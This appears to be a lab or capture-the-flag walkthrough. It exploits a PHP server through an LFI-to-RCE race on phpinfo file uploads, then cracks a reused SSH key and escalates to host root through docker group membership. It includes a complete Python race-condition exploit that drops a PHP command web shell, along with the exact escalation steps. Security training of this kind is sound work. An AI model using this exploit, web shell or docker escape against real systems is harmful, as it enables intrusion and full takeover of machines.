
We'll perform an nmap scan on the IP 192.168.5.23 that we identified with arp-scan, and we can see it has port 80 open.

![[Pasted image 20260312180200.png]]

We'll use an nmap script to enumerate the http port and see it reveals an info.php
![[Pasted image 20260312180231.png]]

![[Pasted image 20260312180253.png]]
When checking the directives section in phpinfo, we see file_uploads is enabled among others we've reviewed
![[Pasted image 20260312180353.png]]
This means we can upload files. If we search online for "phpinfo abusing file uploads", we'll find a section about this on HackTricks.

https://hacktricks.wiki/en/pentesting-web/file-inclusion/lfi2rce-via-phpinfo.html
This vulnerability shows LFI to RCE - meaning through Local File Inclusion we can achieve Remote Code Execution. First we need an LFI.

To manually exploit this vulnerability:

Open Burp Suite and reload the phpinfo page to intercept the request.

Initially we only see a GET request to info.php
![[Pasted image 20260312180859.png]]

But if we change the request to POST (right-click), the Content-Type appears
![[Pasted image 20260312180959.png]]

In Content-Type we can simulate a file upload by adding the boundary.

We saw this in file upload class when bypassing code sanitization - there were lines delimiting the uploaded file's content and a Boundary (a unique string in the Content-Type header that separates parts in a multipart/form-data request). Here we see it's -----------------------974856 etc.
![[Pasted image 20260312181426.png]]

Understanding this, we know we need to replicate the structure for the server to interpret it correctly.

Searching for "file upload boundary" shows the format:
https://stackoverflow.com/questions/3508338/what-is-the-boundary-in-multipart-form-data
![[Pasted image 20260312182213.png]]

Now if we modify the request's Content-Type with this and define the boundary, we'll have the delimiters and part of the structure
![[Pasted image 20260312182347.png]]
(Note: In the boundary we only put -- but when using it we always need to add two more hyphens for it to work, and the final closing boundary needs two more at the end)
![[Pasted image 20260312182907.png]]
When sending the request, we see it processed correctly and the server uploaded the file to /tmp/

![[Pasted image 20260312183627.png]]

But we can't access this path directly, which is where LFI comes in. First let's examine the web structure.

Returning to the main index.php page, we'll use wfuzz to fuzz the parameter and see if we can list known files/directories
![[Pasted image 20260312184547.png]]
![[Pasted image 20260312184742.png]]
After a while we see a parameter called filename that lets us view /etc/passwd
![[Pasted image 20260312184839.png]]
Now if we search the /tmp directory with our uploaded file's name, we see nothing - suggesting a race condition where files are quickly deleted. Creating more files still doesn't show them, confirming this
![[Pasted image 20260312185053.png]]
Checking HackTricks again, there's a script that handles this race condition 
```
#!/usr/bin/env python3
import re, html, socket, threading

HOST = 'target.local'
PORT = 80
PHPSCRIPT = '/phpinfo.php'
LFIPATH = '/vuln.php?file=%s'  # sprintf-style where %s will be the tmp path
THREADS = 10

PAYLOAD = (
    "<?php file_put_contents('/tmp/.p.php', '<?php system($_GET[\\"x\\"]); ?>'); ?>\r\n"
)
BOUND = '---------------------------7dbff1ded0714'
PADDING = 'A' * 6000
REQ1_DATA = (f"{BOUND}\r\n"
             f"Content-Disposition: form-data; name=\"f\"; filename=\"a.txt\"\r\n"
             f"Content-Type: text/plain\r\n\r\n{PAYLOAD}{BOUND}--\r\n")

REQ1 = (f"POST {PHPSCRIPT}?a={PADDING} HTTP/1.1\r\n"
        f"Host: {HOST}\r\nCookie: sid={PADDING}; o={PADDING}\r\n"
        f"User-Agent: {PADDING}\r\nAccept-Language: {PADDING}\r\nPragma: {PADDING}\r\n"
        f"Content-Type: multipart/form-data; boundary={BOUND}\r\n"
        f"Content-Length: {len(REQ1_DATA)}\r\n\r\n{REQ1_DATA}")

LFI = ("GET " + LFIPATH + " HTTP/1.1\r\nHost: %s\r\nConnection: close\r\n\r\n")

pat = re.compile(r"\\[tmp_name\\]\\s*=&gt;\\s*([^\\s<]+)")


def race_once():
    s1 = socket.socket()
    s2 = socket.socket()
    s1.connect((HOST, PORT))
    s2.connect((HOST, PORT))
    s1.sendall(REQ1.encode())
    buf = b''
    tmp = None
    while True:
        chunk = s1.recv(4096)
        if not chunk:
            break
        buf += chunk
        m = pat.search(html.unescape(buf.decode(errors='ignore')))
        if m:
            tmp = m.group(1)
            break
    ok = False
    if tmp:
        req = (LFI % tmp).encode() % HOST.encode()
        s2.sendall(req)
        r = s2.recv(4096)
        ok = b'.p.php' in r or b'HTTP/1.1 200' in r
    s1.close(); s2.close()
    return ok

if __name__ == '__main__':
    hit = False
    def worker():
        nonlocal_hit = False
        while not hit and not nonlocal_hit:
            nonlocal_hit = race_once()
        if nonlocal_hit:
            print('[+] Won the race, payload dropped as /tmp/.p.php')
            exit(0)
    ts = [threading.Thread(target=worker) for _ in range(THREADS)]
    [t.start() for t in ts]
    [t.join() for t in ts]

```

We adapt it to our specifications by editing HOST, PHPSCRIPT, LFIPATH, etc., and the payload since we want to send a reverse shell.

Once inside the machine, we check for privilege escalation opportunities but find nothing, so we use the linpeas tool.  
![[Pasted image 20260312202240.png]]  
Among all the reported vulnerabilities, we see a folder called `oldkeys`.  
![[Pasted image 20260312203220.png]]  
We navigate to the path, copy it to `/tmp`, and extract it. Inside, we find RSA keys for SSH access, but they are encrypted.  
![[Pasted image 20260312204020.png]]  

If we copy them to our machine and save them in a `.txt` file, we can use a John the Ripper script called `ssh2john`, which converts the key into a hash for cracking.  
![[Pasted image 20260312204510.png]]  
![[Pasted image 20260312204528.png]]  
We appear to have the password, but attempting to SSH as `root` fails.  
Let's check if the credentials were reused for direct escalation on the machine.  
![[Pasted image 20260312205010.png]]  

We haven't mentioned this yet, but the terminal shows a series of numbers and letters next to the username, indicating we're inside a container. This strongly suggests we'll need to perform Docker breakout.  

We check system processes to see if any are shared with the host machine, but find nothing, so shellcode injection isn't possible.  
![[Pasted image 20260312205225.png]]  

After further investigation, we find an `ssh` folder containing credentials for another user.  
![[Pasted image 20260312205401.png]]  
![[Pasted image 20260312205442.png]]  
The credentials belong to an `admin` user for IP `192.168.150.1` (the host IP). This time, we attempt direct access without cracking, using the `root` credentials.  
![[Pasted image 20260312210231.png]]  
They reused the credentials again.  
Now we're on the victim machine.  
![[Pasted image 20260312210329.png]]  
Next, we attempt the final escalation.  

We notice we belong to the `docker` group, so we can abuse mounts by creating an image, mounting the entire root filesystem into a container, and accessing anything we want.  

We create a container using the existing image and mount the host's root filesystem to `/mnt/root` with `-v`.  
![[Pasted image 20260312210941.png]]  

Once inside, we have two options:  

1. Go directly for the flag.  
2. Set SUID permissions on `bash`. Since mounts synchronize directories, any changes we make in the mounted path will reflect on the host.  

We modify `bash`, exit, and execute `bash -p` to get a root shell.  
![[Pasted image 20260312211559.png]]  
![[Pasted image 20260312211640.png]]
